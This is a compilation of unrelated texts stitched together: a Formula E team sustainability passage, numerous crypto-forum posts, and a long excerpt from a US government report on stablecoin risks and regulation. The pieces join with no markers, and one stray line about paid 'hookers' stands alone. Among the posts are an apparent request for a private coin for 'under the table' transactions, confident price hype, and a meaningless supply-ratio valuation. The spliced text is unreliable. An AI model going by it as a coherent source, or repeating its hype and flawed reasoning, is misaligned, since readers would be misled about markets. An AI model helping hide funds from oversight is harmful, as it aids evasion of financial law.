As one of the founding teams of the FIA Formula E World Championship, Envision Racing  owned by world-leading greentech company Envision Group  boasts an impressive record both on and off the track. Aside from securing 11 wins and 33 podiums in their 84 races, Envision Racing was the first carbon neutral Formula E team (PAS 2060). It is also one of a handful to achieve the FIAs Three Star Sustainability Accreditation, and the only sports team to partner with the UK government to support their Together For Our Planet initiative and the UNs COP26 global summit.

The teams new Season 8 livery featuring the Algorand Foundation logo will first be seen at the UNs COP26 global climate conference. The new-look car will be displayed in the Green Zone at COP26 from Monday November 1st until Friday 12th.

Congratulations to everyone!

I know it's hard to appreciate these kinds of charts in the flow of the market, but BTC found a great place in $60K level for nearly 3 weeks now is just incredible!

In these 18 days span, BTC only once dipped to $58K and pumped right back to $60K in less than a day!

Pumptober was awesome, now on to the No Sell November *and then*, we can enter the new year where everyone at least has the financial freedom to do what they want in this Xmas

The bull run is just getting to heat up, the next stop $100K!

First, let's talk about greed. In your head, picture a really greedy character. You are probably thinking of Scrooge mc'duck. Let's add a little more realism into it. Give him a nice suit, an expensive watch. Does he look like a "wall-street guy"? You know, one of those guys that we say they produce nothing of value. Create fortunes out of thin air, sell shit stocks to gullible buyers, people that gamble with the livelihoods of others. That use insider trading, ponzi schemes and every dirty trick in the book to get the edge.

Now, let's talk about you. Yes, you. HODL-ing that shitcoin, wanting to go back a couple of years to buy more bitcoins, waiting for the bear market so you can buy the dip. Looking to turn 1$ into 100, and 100 into a million. Not from the sweat of your brow, but from thin air. So that you can retire early and live.... on the back of others. A big house with a pool that some other guy keeps clean. With a nice lawn that you won't cut yourself. Go to fancy restaurants where high stressed cooks tremble before the eyes of a world-known chef, just so they can serve you better. Go to a nice vacation somewhere exotic, whey the staff is brought from 3rd world countries and paid pennies. Sounds a lot like the life some very rich and much-despised guys live today. Sounds a lot like your boss's boss. Or that wall street banker we talked about earlier. 

Regular guys, hard-working guys, investing the money they have hoping to take a slice from some other poor soul that's just like you. But you say to yourself, it's a dog eat dog world. He's not like me, he deserves it. He didn't do his research, he didn't read the coin papers, he has paper-hands. He shouldn't have invested more than he could afford to lose. He's a sucker! I will play the game and win. And, unknowingly or willingly, you will step on the bodies of others to get yourself in the front row of life. We are becoming the petty bosses and little tyrants that we hate. We wear our gains as a badge of honor, even though that means somebody lost that money. We admire those who made it big, hoping one day we'll become like them. We lie to eachtoher, we steal, we want to consume more and hope the growth never stops. All this while the planet is already dying. We are using ungodly amounts of energy for this folly. We have bought more than we needed, leaving most having none. And we keep on going, everyday.

Just like social media enabled stupidity to enter the mainstream and give it a voice, crypto did the same for greed. And that's what's going to kill us all.

Fiat currency is a lot like Proof of Work  fiat miners compete solving puzzles 8 hours 5 days a week to be rewarded fiat in 1 month epochs (or in 2 week epochs, depending on your fiat mining pool, aka "job"). Pretty energy consuming  3 meals a day every day, even on when on idle, and the maintenance is so high it's hardly even worth it.

Fiat is also a lot like Proof of Stake in that there are few top holders who have near absolute control over the network and  governance. Smaller holders constantly seek "validation" from them. No puzzles whatsoever. Although staking rewards are dropping like crazy and even have gone negative in some staking pools (aka, "countries").

All I wish for at the moment is to go full 2.0 honestly and ditch the PoW mode for good. Life as Proof of Stake seems like a lot more fun but the entry threshold is pretty goddamn steep. Coincidentally, in most countries you can totally live off staking rewards from 32 ETH. Anyway...

Any other similarities?

This morning while I was pacing around my apartment building up momentum to take a shit, I saw Aaron Rodgers' [post on IG](https://www.instagram.com/p/CVvsViiPHtT/) about his recent decision to receive a portion of his salary in Bitcion. The post reads:  

&gt; *Im excited about Bitcoin because I believe its the future of money: its valuable, super secure, and no one can mess with it. Thats why Im teaming up with Cash App to take a portion of my salary in bitcoin today.

&gt; *Bitcoin is new &amp; the concept can be intimidating, so to make Bitcoin more accessible to my own fans Im giving out a total of $1 million in btc now too. Just drop your $cashtag, use #PaidInBitcoin and follow @CashApp now for a chance to own some for yourself.*

Of course I came up with an amazing John Wick joke to match his halloween costume and entered the contest. About an hour later, I received a couple push notifications that Aaron Rodgers had sent me bitcoin and that I needed to accept it. My first thought was holy shit, Aaron rodgers sent me a million dollars in bitcoin. Obviously I didn't read the promotion details in any way. That said, when I checked it and found a cool $100 BTC, I was pretty pumped. I guess my John Wick joke was solid. The fact that it came from Rodgers, even though I'm sure it was some assistant, still makes it feel pretty special. Here's [proof](https://imgur.com/a/D1sUrOZ0) of the payment.   

The list of athletes opting to get paid in BTC is growing by the month. Currently just from a quick google search:   

* Cade Cunningham
* Aaron Rodgers
* Sean Culkin
* Saquon Barkley 
* Trevor Lawrence
* Russell Okung
* Any Sacramento Kings players that want to.

The list is a lot longer, I just got bored. These athletes present an interesting marketing opportunity for exchanges that want to catch up to coinbase. For example, Voyager recently announced they are the official crypto partner of the Dallas Mavs and Mark Cuban ran a similar promotion.  Of course, some of these partnerships and endosements are scams - see Kim K and Ethereum Max, and anything involving scum of the earth people like jake paul.   

Has anyone else had success with these types of promotions?

Now that we all get to see a prime example of a rug pull in the squid token scam, hopefully this stupid fucking sentiment I see anytime a blatant pump and dump is discussed on this sub will finally die out. 

 If youre one of those people who was constantly saying this (there were a lot of you) now you get to see and hopefully understand how that money does NOT come out of thin air, and for everyone who gets to cash out big, there are THOUSANDS of people who got totally fucked.

If someone is annoyed at a pump and dump flying through the ranks, they have a right to be. Stop gaslighting them and calling them jealous just because they dont appreciate your shitcoins and obvious scams. Theyre watching newbies getting absolutely rugged time and time again, many of them chased out of the crypto market entirely with the anecdotal experience that its a scam. 

And no, speculating on BTC or ETH or any number of the many projects with actual plans for the future, that have continued to appreciate and develop over time, is not the same. Not even close.

Obviously SQUID was a massive rugpull which is annoying because it was probably some people's first exposure to crypto, and some probably invested money they couldn't afford to lose.

It would show the world the power of crypto if we created a totally trustless, decentralized version of squid games using smart contracts. Something like an NFT that has a flat price, and all proceeds are locked into a smart contract that can only be paid out to the winner. 1% of the prize pool could be withheld to pay Dev's for their work.

The logistics of coding games into a smart contract and having potentially millions of players is staggering, but if there is any technology that can handle it in a trustless way it is blockchain.

If there seems like a lot of interest I will set up a discord or something

To keep it short, I live in a country where things are pretty lax. Some things here are kind of like the grey zone laws in the United States where its not necessarily legal or illegal. I need to figure out the best possible cryptocurrency for my grandmother to store money, and make large under the table transactions. My grandmother needs it to be safe as she wouldnt want to have to kill me if her money gets lost. 

I have heard some things about XLM. Is this a good one? It needs to be very private. Please let me know of any others that may be better, thanks. 

All the hookers are treated/paid well and fed 3 times a day.

**II. Risks and Regulatory Gaps Loss of Value:**

**Risks to Stablecoin Users and Stablecoin Runs**

An instrument can serve as a reliable means of payment or store of value only when there is confidence in its value, particularly in periods of stress. For stablecoins, this confidence could arise in part from its redeemability, and the belief that such redeemability is supported by a stabilization mechanism that will function effectively both during normal conditions and during periods of stress. Confidence in a stablecoin may be undermined by factors including: (1) use of reserve assets that could fall in price or become illiquid;21 (2) a failure to appropriately safeguard reserve assets; (3) a lack of clarity regarding the redemption rights of stablecoin holders;22 and (4) operational risks related to cybersecurity and the collecting, storing, and safeguarding of data.

Failure of a stablecoin to perform according to expectations would harm users of that stablecoin and could pose systemic risk. The mere prospect of a stablecoin not performing as expected could result in a run on that stablecoin  i.e., a self-reinforcing cycle of redemptions and fire sales of reserve assets. Fire sales of reserve assets could disrupt critical funding markets, depending on the type and volume of reserve assets involved. Runs could spread contagiously from one stablecoin to another, or to other types of financial institutions that are believed to have a similar risk profile. Risks to the broader financial system could rapidly increase as well, especially in the absence of prudential standards. The internal dynamics of a stablecoin run, as well as the potential implications of such a run for the financial system and broader economy, would likely depend on the volume and liquidity characteristics of reserve assets sold,23 as well as on broader economic and financial conditions. Some stablecoin arrangements are already sizable, and many stablecoins are growing. A run occurring under strained market conditions may have the potential to amplify a shock to the economy and the financial system.

**Payment System Risks**

Stablecoin arrangements transfer mechanisms (and potentially other aspects of the arrangements activities)between issuance and redemptioncan provide opportunities for efficient payment processing but also can pose risks to their participants and the broader financial system. Payment stablecoins face many of the same basic risks as traditional payment systems, including credit risk, liquidity risk, operational risk, risks arising from improper or ineffective system governance, and settlement risk.24 When not managed comprehensively, these risks can make payment systems less available and less reliable for users, and they can create financial shocks or operate as a channel through which financial shocks spread.

These risks have the potential to manifest in novel ways as a result of a stablecoin arrangements use of different technologies, transaction processes, and governance structures, among other factors. For example, unlike traditional payment systems where risk is managed centrally by the payment system operator, some stablecoin arrangements feature decentralized decision-making and complex operations where no single organization is responsible or accountable for risk management and resilient operation of the entire arrangement.

Operational risk is the risk that deficiencies in information systems or internal processes, human errors, management failures, or disruptions from external events will result in the reduction, deterioration, or breakdown of services. Operational issues in a payment system can disrupt the ability of users to make payments, which can in turn disrupt economic activity. If an operational problem results in a payment error or enables fraudulent payments, users could lose their money. Stablecoin arrangements face many of the same types of operational risks as existing payment systems but could have the potential to be more operationally resilient in some respects. However, they can also face novel operational risks related to the validation and confirmation of stablecoin transactions and the management and integrity of the distributed ledger. For example, incentives to validate transactions may not adequately motivate participants to respond to demand for processing transactions, resulting in network congestion. Operational risks may also be more difficult to manage or supervise in a stablecoin arrangement, especially when the supporting infrastructure is beyond the control of any one organization (including the entities involved in the stablecoin arrangement) and there is no clear entity to regulate.

Settlement risk is the risk that settlement in a payment system will not take place as expected. Well-designed and well-operated payment systems ensure transactions settle reliably, giving users confidence that their funds settlement is certain and final at a given time. Stablecoin arrangements that do not clearly define the point at which settlement is final in their rules and procedures can pose heightened uncertainty and create credit and liquidity pressures for arrangement participants. For example, many distributed ledger networks are permissionless, requiring no prior approval for new users to participate in network activities. When open network access is combined with consensusbased settlement mechanisms, technical settlement may be subject to uncertainty for longer periods, with no single party accountable for defining or ensuring legal settlement finality, creating questions about the reliability and finality of payments.

In addition, liquidity risk can arise in a stablecoin arrangement from misalignment of the settlement timing and processes between stablecoin arrangements and other systems (e.g., if a stablecoin arrangement operates 24/7, but the payment system used for funding stablecoin issuance and returning fiat currency upon stablecoin redemption has regular business hours), causing temporary shortages in the quantity of stablecoins available to make payments.

These risks may remain inadequately addressed for stablecoin arrangements due to the lack of consistent risk-management standards among arrangements, the number of different key parties that may be involved in an arrangement, and the operational complexity of an arrangement.25 Moreover, ifmany entitiesareinvolved inoperating the infrastructure where transfers take place,it may be challenging for the supervisor of the issuer to requirethat the arrangements rules support effective risk management and governance across the entire arrangement.

**Risks of Scale: Systemic Risk and Concentration of Economic Power**

While small in comparison to traditional forms of private and public money, stablecoins have grown rapidly in the last year and may continue to grow rapidly at both an individual and aggregate level. For individual stablecoins, the potential for rapid growth may reflect economies of scale and scope; network effects that cause demand for a specific stablecoin to increase as more firms and consumers use the stablecoin; and first-mover advantages. In some cases, rapid scaling may be supported by access to existing customer bases and further enabled by access to end users data.

The potential for an individual stablecoin to scale rapidly raises three sets of policy concerns. First, a stablecoin issuer or a key participant in a stablecoin arrangement (e.g., a custodial wallet provider) could pose systemic risk  meaning that the failure or distress of that entity could adversely affect financial stability and the real economy.26 Second, the combination of a stablecoin issuer or wallet provider and a commercial firm could lead to an excessive concentration of economic power. These policy concerns are analogous to those traditionally associated with the mixing of banking and commerce, such as advantages in accessing credit or using data to market or restrict access to products. This combination could have detrimental effects on competition and lead to market concentration in sectors of the real economy. Third, a stablecoin that becomes widely adopted as a means of payment could present concerns about anti-competitive effects, for example, if users of that stablecoin face undue frictions or costs in the event they choose to switch to other payment products or services. Concerns about anti-competitive effects are thus likely to be greater absent interoperability standards for stablecoins and stablecoin arrangements.

In addition to the potential for individual stablecoins to scale rapidly, the aggregate growth of stablecoins could also have important implications for the financial system and the macroeconomy. If insured depository institutions lose retail deposits to stablecoins, and the reserve assets that back stablecoins do not support credit creation, the aggregate growth of stablecoins could increase borrowing costs and impair credit availability in the real economy. The perception of the safety of insured depository institutions relative to stablecoins could also shift during times of stress, with large and sudden inflows or outflows of deposits possible.

**Regulatory Gaps**

Today, stablecoin arrangements are not subject to a consistent set of prudential regulatory standards that address the risks discussed above. Moreover, the number of different key parties that may be involved in an arrangement, and the operational complexity of these arrangements, pose challenges for supervisory oversight. For example, even if a given issuer of stablecoin is a bank, insight into the activities of key entities in the arrangement depends on the structure of the relationship and the nature of the services, if any, provided to the issuer bank as client.27 To address these gaps, a consistent and comprehensive regulatory framework is needed both to increase transparency into key aspects of stablecoin arrangements and to ensure that stablecoins function in both normal times and in stressed market conditions.

**III. Recommendations**

As discussed above, stablecoins have multiple uses involving different types of participants and arrangements, which implicate a range of regulatory concerns.Stablecoins and stablecoin arrangements raise significant concerns from an investor protection and market integrity perspective.Stablecoin arrangements and digital asset trading activities may implicate the jurisdiction of the SEC and/or CFTC.Depending on the facts and circumstances, a stablecoin may constitute a security, commodity, and/or derivative implicating the jurisdiction of the SEC, and be subject to the U.S. federal securities laws, or implicating the jurisdiction of the CFTC, and be subject to the CEA.The federal securities laws and/or the CEA may apply to the stablecoin, the stablecoin arrangement, transactions in, and/or participants involved in, the stablecoin or stablecoin arrangement, and/ or derivatives of any of the foregoing instruments.The SEC and CFTC have broad enforcement, rulemaking, and oversight authorities over transactions and participants falling within their respective jurisdictions to address the investor protection and market integrity risks discussed above. To the extent within the jurisdiction of the SEC or the CFTC, trading, lending, borrowing, and other activity involving stablecoins must be conducted in compliance with applicable provisions of the federal securities laws and the CEA, as well as applicable regulations (See Digital Asset Trading Platforms and DeFi).

Stablecoins also present important prudential concerns, as discussed in Part II.These prudential concerns relate to the potential for stablecoin runs, payment system risks, and the possibility that some stablecoins may rapidly scale. Because responsibilities within many of these arrangements are widely distributed, and currently fall within the jurisdiction of different regulatory agencies, or outside of the regulatory perimeter altogether, there is a risk of incomplete or fragmented oversight. Stablecoin arrangements have grown, and may continue to grow, rapidly. And as these arrangements grow, so may the risks associated with them. The recommendations presented below are focused on the prudential risks identified with respect to payment stablecoins.28

**Legislation**

To address prudential risks associated with the use of stablecoins as a means of payment, the agencies recommend that Congress act promptly to ensure that payment stablecoins are subject to appropriate federal prudential oversight on a consistent and comprehensive basis. Because payment stablecoins are an emerging and rapidly developing type of financial asset, legislation should provide regulators flexibility to respond to future developments and adequately address risks across a variety of organizational structures.

Legislation should address the risks outlined in this report by establishing an appropriate federal prudential framework for payment stablecoin arrangements.29 In particular, with respect to stablecoin issuers, legislation should provide for supervision on a consolidated basis; prudential standards; and, potentially, access to appropriate components of the federal safety net. To accomplish these objectives, legislation should limit stablecoin issuance, and related activities of redemption and maintenance of reserve assets, to entities that are insured depository institutions. The legislation would prohibit other entities from issuing payment stablecoins. Legislation should also ensure that supervisors have authority to implement standards to promote interoperability among stablecoins.

Insured depository institutions include both state and federally chartered banks and savings associations, the deposits of which are covered, subject to legal limits, by deposit insurance, and which have access to emergency liquidity and Federal Reserve services.30 Like other insured depository institutions, insured depository institutions that issue stablecoins would be subject to supervision and regulation at the depository institution level by a federal banking agency and consolidated supervision and regulation by the Federal Reserve at the holding company level.31 The standards to which these institutions are subject include capital and liquidity standards that are designed to address safety and soundness and, for the largest banking organizations, also include enhanced prudential standards that address financial stability concerns. Under the Federal Deposit Insurance Act, insured depository institutions also are subject to a special resolution regime that enables the orderly resolution of failed insured depository institutions by, among other mechanisms, protecting customers insured deposits, and according priority to deposit claims over those of general creditors, and limits any potential negative systemic impacts in the event of bank failure.

As discussed above, apart from a stablecoin issuer, other key entities in the stablecoin arrangement may be critical to a stablecoins ability to function as a means of payment and may help a stablecoin to scale (See Part I, Activities and Participants in Stablecoin Arrangements). As noted above, the core functions of a stablecoin arrangement  (1) creation of the stablecoin, (2) its transfer between parties, and (3) storage of the stablecoin by end users, as described in Part I (See Part I, Creation of Stablecoins, and Transfer and Storage of Stablecoin)  can be carried out by the activities of separate entities, within an arrangement that may be highly distributed and complex. Because the activities and functions in a stablecoin arrangement may be distributed across different parties, a prudential  framework that is exclusively focused on stablecoin issuers is likely to leave certain payment system risks inadequately or inconsistently addressed.

Given the central role that custodial wallet providers play within a stablecoin arrangement, and the risks attendant to the relationship between custodial wallet providers and stablecoin users, Congress should require custodial wallet providers to be subject to appropriate federal oversight. Such oversight should include authority to restrict these service providers from lending customer stablecoins, and to require compliance with appropriate risk-management, liquidity, and capital requirements. In addition, to address concerns about concentration of economic power, Congress should consider other standards for custodial wallet providers, such as limits on affiliation with commercial entities or on use of users transaction data.

In addition to stablecoin issuers and custodial wallet providers, other entities may perform activities that are critical to the functioning of the stablecoin arrangement (See Part I, Activities and Participants in Stablecoin Arrangements). To ensure that stablecoin arrangements are subject to a comprehensive regulatory framework, Congress should provide the federal supervisor of a stablecoin issuer with the authority to require any entity that performs activities critical to the functioning of the stablecoin arrangement to meet appropriate risk-management standards, such as the Principles for Financial Market Infrastructures32 as adapted to stablecoin arrangements.33 Legislation should also provide appropriate agencies with examination and enforcement authority with respect to the stablecoin activities of these entities. Finally, supervisors should have the ability to adopt standards to promote interoperability among stablecoins, or between stablecoins and other payment instruments.

Taken together, legislation along these lines would address the prudential risks described in Part II of this report on a comprehensive and consistent basis:

	 User Protection and Run Risk: Require stablecoin issuers to be insured depository institutions, which are subject to appropriate supervision and regulation, at the depository institution and the holding company level.

	 Payment System Risk: Require custodial wallet providers to be subject to appropriate federal oversight. In addition, provide the supervisor of a stablecoin issuer with authority to require any entity that performs activities critical to the functioning of the stablecoin arrangement to meet appropriate risk-management standards.

	 Systemic Risk and Concentration of Economic Power: Require stablecoin issuers to comply with activities restrictions that limit affiliation with commercial entities. Supervisors also should have the authority to implement standards to promote interoperability among stablecoins. Limits on custodial wallet providers affiliation with commercial entities or on custodial wallet providers use of user transaction data may also help address these issues.

**Interim Measures**

The agencies believe that legislation is urgently needed to comprehensively address the prudential risks posed by payment stablecoin arrangements. While Congress considers how to address risks associated with payment stablecoin arrangements, the agencies will continue to use their existing authorities to address these prudential risks to the extent possible. In the absence of Congressional action, the Council may consider steps available to it to address the risks outlined in this report.

**A. Regulatory Agencies**

Given the significant and growing risks posed by stablecoins, the agencies are committed to taking action to address risks falling within each agencys jurisdiction and to continued coordination and collaboration on issues of common interest across the federal financial agencies. For example, in evaluating a charter application, the banking agencies will seek to ensure that applicants address the risks outlined by this report, including risks associated with stablecoin issuance and other related services conducted by the banking organization or third-party service providers. In the context of those stablecoins that are securities, commodities, and/or derivatives, application of the federal securities laws and/or the CEA would provide important investor and market protections, as well as transparency benefits. Relevant authorities, including the Department of Justice, may consider whether or how section 21(a)(2) of the Glass-Steagall Act may apply to certain stablecoin arrangements.34 In addition, the Consumer Financial Protection Bureau (CFPB) and consumer financial protection laws also provide a number of safeguards in the payments sector, including but not limited to the Electronic Fund Transfer Act, the Gramm-Leach-Bliley Act, and the Consumer Financial Protection Act.35 Finally, a stablecoin arrangement may also offer money transmission services, triggering federal AML/ CFT obligations under the Bank Secrecy Act (BSA), supervised and enforced by the Financial Crimes Enforcement Network (FinCEN).

**B. Council**

In the absence of Congressional action, the agencies recommend that the Council consider steps available to it to address the risks outlined in this report. Such steps may include the designation of certain activities conducted within stablecoin arrangements as, or as likely to become, systemically important payment, clearing, and settlement (PCS) activities.36 Designation would permit the appropriate agency to establish risk-management standards for financial institutions that engage in designated PCS activities, including requirements in relation to the assets backing the stablecoin, requirements related to the operation of the stablecoin arrangement, and other prudential standards.37 Financial institutions that engage in designated PCS activities also would be subject to an examination and enforcement framework. Any designation would follow a transparent process.

**Illicit Finance Risk**

As with all digital assets, stablecoins can present money laundering and terrorist financing (ML/TF) risks. The magnitude of these risks depends on various factors, including the application of antimoney laundering and countering the financing of terrorism (AML/CFT) controls, the degree to which it is adopted by the public, and the design of the stablecoin arrangement. To further prevent misuse of stablecoins and other digital assets by illicit actors, Treasury will continue leading efforts at the FATF to encourage countries to implement international AML/CFT standards and pursue additional resources to support supervision of domestic AML/CFT regulations. Treasury will also continue to assess the illicit financing risks to the United States associated with stablecoins and other digital assets, including through the forthcoming National Risk Assessments on Money Laundering, Terrorist Financing, and Proliferation Financing, and Illicit Finance Strategy.

A critical factor for illicit finance risk mitigation, regardless of the features of a stablecoins design, is that international standards for the regulation and supervision of service providers associated with stablecoins and other digital assets are effectively implemented worldwide.Stablecoins and other digital assets can be used to transfer large amounts of value across borders very quickly. A rapid increase in cross-border payments could amplify ML/TF risks due to the uneven implementation of global international AML/CFT standards developed by the FATF.38 While the United States regulates and enforces AML/CFT obligations for covered service providers, most countries have either not put these standards into their regulatory frameworks or are failing to supervise them, leading to gaps in AML/CFT regulation and supervision for stablecoins and other digital assets. Illicit actors can exploit these gaps by using services in countries with weak regulatory and supervisory regimes to launder funds, store proceeds of crime, or evade sanctions in stablecoins or other digital assets.

The promise of a stable value can, particularly when paired with the reach of commercial firms such as telecommunications or technology providers, increase the potential that stablecoins scale rapidly. Criminals often use the most common and liquid forms of value for ML and TF, and mass-adopted stablecoins or other digital assets may be attractive to illicit actors, which could heighten ML/TF risks. Conversely, mass adoption of a well-regulated and supervised stablecoin with strong AML/CFT protections built into the stablecoin could provide greater transparency into illicit financial activity and could mitigate ML/TF risks, especially if the stablecoin takes market share away from riskier alternatives.

Like other digital assets, stablecoins may be used to transact pseudonymously, depending on the underlying architecture.39 However, in certain instances, stablecoin addresses and transactions on public blockchains can be paired with information, if available, that can enable regulators and law enforcement to identify address owners.40Users of some stablecoins can transact without  the involvement of financial institutions subject to AML/CFT obligations, thus limiting collection of and access to investigative information and preventative measures used to identify illicit financial activity.

To encourage international implementation of AML/CFT standards, Treasury will continue to engage with the FATF to encourage countries to effectively implement the FATF standards for virtual assets. On October 28, 2021, the FATF published updated guidance on the implementation of the FATF standards for virtual assets and virtual asset service providers, which describes how the standards apply to digital assets and help countries and the private sector better understand how to effectively implement standards. As a result of the publication of the FATF standards, the FATF will now redouble its efforts on effective implementation of the standards on digital assets by member countries, and the United States will continue to support these efforts at the FATF and engage bilaterally to encourage countries to meet these standards.

In the United States, most stablecoins are considered convertible virtual currency (CVC) and treated as value that substitutes for currency under FinCENs regulations.41 All CVC financial service providers engaged in money transmission, which can include stablecoin administrators and other participants in stablecoin arrangements, must register as money services businesses (MSBs) with FinCEN. As such, they must comply with FinCENs regulations, issued pursuant to authority under the BSA, which require that MSBs maintain AML programs, report cash transactions of $10,000 or more, file suspicious activity reports (SARs) on certain suspected illegal activity, and comply with various other obligations.42 Current BSA regulations require the transfer of certain specific information well beyond what can be inferred from the blockchain resulting in non-compliance. While the Office of Foreign Assets Control (OFAC) has provided guidance on how the virtual currency industry can build a risk-based sanctions compliance program that includes internal controls like transaction screening and know your customer procedures, there may be some instances where U.S. sanctions compliance requirements (i.e., rejecting transactions) could be difficult to comply with under blockchain protocols.

While regulations are broadly sufficient to cover stablecoin administrators and other participants in stablecoin arrangements, Treasury will pursue additional resources, which could enable FinCEN, the Internal Revenue Service (IRS), and federal functional regulators to increase supervision of these regulations. This could result in better private sector compliance and, where it does not, could lead to enforcement actions for non-compliance. Enforcement activity would signal to stablecoin administrators and other financial institutions in the stablecoin industry that they will be held accountable for failing to meet AML/CFT and sanctions obligations, will incentivize compliance, and may enhance pressure on some foreign jurisdictions to follow suit. To that end, FinCENs delegated examiners, the IRS, have been conducting compliance examinations on CVC administrators and  exchangers, including administrators of stablecoin arrangements and the exchanges on which they are offered, since 2014. These examinations have also included foreign-located MSBs doing business in the United States in whole or substantial part.43

FinCEN has taken decisive action when it identifies financial institutions that fail to comply with these obligations. For example, in 2017 FinCEN assessed a $110 million civil money penalty against the foreign-located CVC exchanger BTC-e for failure to comply with the BSAs registration, AML program, reporting, and recordkeeping requirements.44 More recently, FinCEN assessed a $100 million civil money penalty against the foreign-located, non-compliant futures commission merchant BitMEX for failing to maintain an AML Program and a Customer Identification Program, and failure to file SARs.45 That penalty was concurrent with the CFTCs $100 million civil money penalty.46

Treasury in January will report to Congress the National Money Laundering and Terrorist Financing Risk Assessments, which assess the illicit financing risk landscape for digital assets, among other financial products and activities. The Risk Assessments are developed with input from U.S. government stakeholders, including law enforcement, the federal functional regulators, and the intelligence community, and use public or adjudicated case studies to demonstrate how illicit actors are misusing financial assets. The Risk Assessments inform the Illicit Finance Strategy, which is designed to identify goals, objectives, and priorities for disrupting and preventing illicit finance activities within and transiting the U.S. financial system.

**International Standards**

This report considers and builds on the work of international forums, including work that has led to recommendations, standards, principles, and guidance that may apply to stablecoin arrangements. The Financial Stability Board in October 2020 set out ten high-level recommendations that seek to promote coordinated and effective regulation, supervision, and oversight of Global Stablecoin (GSC) arrangements to address the financial stability risks posed by GSCs, both at the domestic and international level, while supporting responsible innovation and providing sufficient flexibility for jurisdictions to implement domestic approaches.

International standard-setting bodies are also pursuing work to examine the application of international standards, principles, and guidance to stablecoin arrangements. For example, the Committee on Payments and Market Infrastructures (CPMI) and the International Organization of Securities Commissions (IOSCO) published a consultative report on the application of the PFMIs to stablecoin arrangements. With respect to illicit finance, the FATF in June 2019 revised its standards to cover digital assets, including stablecoins and service providers, and is working on updated guidance for how to implement these standards.

The agencies are committed to continuing engagement at the FSB and the standard-setting bodies to ensure comprehensive oversight of stablecoin arrangements, further common regulatory outcomes across jurisdictions, and reduce opportunities for regulatory arbitrage.

I literally can't figure this crap out.  I'm not a dummy either.  I have smart contract BNB on trust wallet that I want to move into other crypto on another exchange, but I can't get it out.  I tried swapping it for regular BNB but trust wallet keeps taking the fees from me and then just putting the smart contract BNB back in my wallet.  I've tried sending the smart contract BNB to a crypto.com wallet but it never shows up (I did two very small amount trials after banging my head against a wall).  I've lost out on the cost of fees 3 times trying to do this so I could transfer out.  Any help would be extremely appreciated.

Edit:  I was mistaken, it's smart chain BNB that I have and am trying to convert.  My brain is dead from trying to transfer this...

So I opened a Coinbase account a few weeks ago, and bought a few things. Then, as you might expect, I decided to migrate over to CBP to have access to more tools, lower fees, etc. I went through the usual transfer process and everything from base account moved over fine.

Here's where the freakout comes in. I had regular CB bookmarked in browser, and just went to that to check in on things, completely spacing out my assets had "moved" to the CBP site.

So I see a like 1000% drop in my account value, and started trying to figure out how I had been hacked.

Happy ending, stupid me remembered I was on the wrong site...

Duh.

So what do you think? Should I try to buy some coins? Its not live at the moment, so we all could be really early


Nice Limit nice limit absolutely not annoying 
Some random text to get the limit. I want to invest in good projects as much as i want to buy some shitcoins. Dont want to work till Im 67 like wtf 
I dont expect to get rich fast but i want to accumulate so much money that I could get any loan from a bank for a nice house with a big garden.

[**Winklevoss Brothers NYT Article from 2013**](https://dealbook.nytimes.com/2013/04/11/as-big-investors-emerge-bitcoin-gets-ready-for-its-close-up/) 

With all the crap laid out for Facebook/Meta on Mark Zuckerberg, it is now clear that these two brothers were the brains behind Facebook's birth. They were probably the first whales who bought bitcoin big and are most likely holding a majority of it. They should just buy Meta and rename it to ConnectU, and change the requirement to have an account back to only university students! You cannot possibly disagree that these two are real visionaries. Look at their answer to bitcoin crashing 60% to 120.  


&gt; The 6-foot-5 Winklevoss brothers were unfazed. The brothers said they took advantage of the low prices to buy more.   


&amp;#x200B;

&gt;It has been four years and it has yet to be discredited as a viable alternative to fiat currency, Tyler Winklevoss said. We could be totally wrong, but we are curious to see this play out a lot more.

I cannot even calculate the number of zeroes in their current and future wealth, and probably neither can Mark Zuckerberg.

I just joined this sub about a week ago and I must say, I have no idea what most people are speaking about. Which brings me to what Im making this post about in the first place. I have always had an interest in cryptocurrency but have never fully looked into it. I would like to be able to understand more of what is being posted and as well as learning how it all works. For someone in my shoes what is a good starting point when it comes to crypto? What are some things that are more important to learn about first before just going in head first without real proper knowledge of what I'm doing? I know it's a pretty broad question but figured this would be the place I could get some good information from people who have experience in this. Thank you in advance!

Ive done a stupid calculation. 
I divided the Circulating supply of Cardano(32,066,390,668) from the Circulating supply of Solana (300,941,395). 
32,066,390,668/300,941,395=106.55. 
If I take the result of the ratio calculation 106.55 and multiply it with the price of Cardano(1.67)
I get the price of Solana. 
106.55 * 1.67= 177,93 
Please correct me if Im wrong my math is bad and Im very old ;)
Cardano has a little bit more value then Solana if my calculation are correct. 
Solana price: 174,85
Cardano price: 1,67
Ok to proof my point lets do a reverse calculation. 
The price of Solana 174,85 divided by 106,55 should give me the price of Cardano. 174,85 / 106,55 = 1,64.
Hope this post is any useful to somebody.  I was a little bit surprised by the results to be honest. Both have nearly the same value per coin. 
Tell me your thoughts on this stupid calculation:)

If Bitcoin is the head of Exodia, And Ethereum is the right Hand of Exodia then Id assume Cardano is the left hand of Exodia.

But what is the left and right feet of Exodia?

Are those spots left for meme coins? Or are they coins ran by exchanges?

What would you say fits into which spots and why? Is it safe to say forks off of Bitcoin or Eth would be the last two spots? Does nano or Vet fit into here anywhere?

Any thoughts or help on this would be great! Apparently you cant lose if you get Exodia together but its like 5 different things so its gotta be perfect! And once we manage to figure out the Exodia of portfolios then we never have to work again!

The first time I heard about bitcoin was back when bitcoin was commonly used to by keys to open CSGO crates. I bought my first bag of Sats around that time on really shady sites and Local bitcoins. Crypto was still a very strange thing, seemed really shady and once I was done with CSGO trading I forgot about the existence of Bitcoin. 

In February of this year I found an old  wallet some bitcoin (around $400 in CAD) and I was shocked because it think I paid around $70 the last time I touched crypto. This is where my crypto journey began.  I started researching crypto and eventually started seriously investing. There are many thing I wish I didn't do or did differently now looking back after 9 month.

Yes I wish I took doge and shib more seriously, I was heavily against these meme coins but you have to understand before they mooned buying a bag of doge and shib was pure gambling and that is risk id rather not take. Here are some other thing in my experience so far I wish I did better.

1. BTC and LTC were the only crypto currencies that existed back then so naturally I bought both when I jumped back into crypto. I wish I didnt buy LTC when I started investing
2. When I first learned about interest and staking I bought myself a bag of 1Inch because binance was offering 30 day lockup for \~50% APY. I wish I research more on 1Inch and governance tokens before i committed to such a large bag
3. I wish I didnt overexpose myself to so many altcoins. A good portion of my portfolio is in ETH and BTC but I wish it more of that, and less altcoins. The altcoin swings when BTC dips are quite the roller coaster to be on.
4. I wish I DCA from the start rather than waiting for crashes and dip to buy a lump sum.
